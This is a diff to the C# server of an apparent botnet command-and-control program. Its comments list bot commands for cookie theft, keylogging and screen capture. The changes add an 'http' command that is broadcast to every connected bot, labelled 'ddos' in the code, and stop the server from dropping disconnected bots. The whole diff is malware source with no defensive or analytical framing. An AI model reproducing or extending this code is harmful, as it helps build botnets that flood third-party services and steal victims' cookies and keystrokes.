@@ -122,16 +122,23 @@ namespace Server
                 //command: nocmd / getcmd/ getcookie/ getkeylogger/ getcapture
                 //detail: dir,.../link / start keylogger, stop keylogger/ start capture, stop capture/
                 //else continue
- 
-                if (idBot.Equals("All"))
+                if (command == "http")
                 {
                     handleCommandAllClients(command, detail);
                 }
                 else
                 {
-                    int portBotActive = int.Parse(botActive[2]);
-                    handleCommandOneClient(idBot, command, detail, ipBotActive + ":" + portBotActive);
+                    if (idBot.Equals("All"))
+                    {
+                        handleCommandAllClients(command, detail);
+                    }
+                    else
+                    {
+                        int portBotActive = int.Parse(botActive[2]);
+                        handleCommandOneClient(idBot, command, detail, ipBotActive + ":" + portBotActive);
+                    }
                 }
+
 
 
                 // Xong ctr xóa dl luôn file commandBot
@@ -234,6 +241,28 @@ namespace Server
             {
 
             }
+            else if(command == "http")
+            {
+                string ms = "http?" + detail+"?";
+                List<Task> ddos = new List<Task>();
+                foreach (var cli in clients.Keys)
+                {
+                    ddos.Add(Task.Run(async () =>
+                    {
+                        try
+                        {
+                            clients.TryGetValue(cli, out string ip);
+                            sendMessageSocket(ms, cli.Client);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
+                        }
+                    }));
+                }
+                Console.WriteLine("Excute ddos");
+
+            }    
             else if (command == "getcookie")
             {
 
@@ -507,9 +536,10 @@ namespace Server
                 }
                 else
                 {
-                    DB.resetStatusBotByIpAndPort(clients.Keys.ElementAt(i).Client.RemoteEndPoint.ToString());
-                    clients.Remove(clients.Keys.ElementAt(i));
-                    i--;
+                    //DB.resetStatusBotByIpAndPort(clients.Keys.ElementAt(i).Client.RemoteEndPoint.ToString());
+                    //clients.Remove(clients.Keys.ElementAt(i));
+                    //i--;
+                    Console.WriteLine("Mat ket noi");
                 }
             }
            
